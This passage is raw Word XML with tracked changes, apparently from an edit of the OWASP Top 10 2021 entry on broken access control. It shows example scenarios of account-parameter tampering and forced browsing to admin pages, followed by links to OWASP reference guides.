    <w:p w14:paraId="36784F8C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>attacker can access any user's account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40906C6D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F9C5EC5" w14:textId="067FFDB3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="459" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="460" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`http</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="461" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2CECAF38" w14:textId="77346828" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="462" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> https</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>://example.com/app/accountInfo?acct=notmyacct</w:t>
      </w:r>
      <w:del w:id="463" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0F0AB05E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="464" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="465" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="281CC264" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="725A51AA" w14:textId="516C7D3F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="466" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #2</w:t>
      </w:r>
      <w:del w:id="467" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="468" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> An attacker simply </w:t>
      </w:r>
      <w:del w:id="469" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>force</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="470" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>forces</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> browses to target URLs. Admin</w:t>
      </w:r>
      <w:del w:id="471" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0DFBD0B6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rights are required for access to the admin page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1082839A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79FF683C"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564EB5F7" w14:textId="4A0DCBDA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="472" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> http</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="473" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>://example.com/app/getappInfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A79B6D" w14:textId="0E524E9A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="474" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> http</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="475" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>://example.com/app/admin_getappInfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D025E24"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069E2CB6" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="476" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EE27819" w14:textId="3362C45E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="477" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">If an unauthenticated user can access either page, </w:t>
      </w:r>
      <w:del w:id="478" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>it’s</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="479" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>it's</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a flaw. If a</w:t>
      </w:r>
      <w:del w:id="480" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="01263BF1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>non-admin can access the admin page, this is a flaw.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D62C8C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D77BFD7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## References</w:t>
      </w:r>
      <w:ins w:id="481" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56077D4C" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F141825" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="482" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="483" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="70EF4703" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="484" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="785EBB33" w14:textId="091E6ED2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="485" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="486"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Proactive Controls: </w:t>
      </w:r>
      <w:ins w:id="487" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Enforce </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Controls](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="488"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489" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/OWASP_Proactive_Controls#6:_Implement_Access_Controls</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="490" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-proactive-controls/v3/en/c7-enforce-access-controls</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654097A0" w14:textId="642651AD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="491" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="492"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Application Security Verification Standard: V4 Access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Control](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="493"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494" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="495" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-application-security-verification-standard</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D62E0F3" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="496" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="497" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="498"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Testing Guide: Authorization </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="499"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500" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="501" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/latest/4-Web_Application_Security_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing</w:t>
      </w:r>
      <w:del w:id="502" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_for_</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="503" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/05-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:del w:id="504" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7A05B7F4" w14:textId="2287AAC5" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="505" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="506" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>_Testing/README)</w:t>
        </w:r>
        <w:r w:rsidR="00474B8C">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
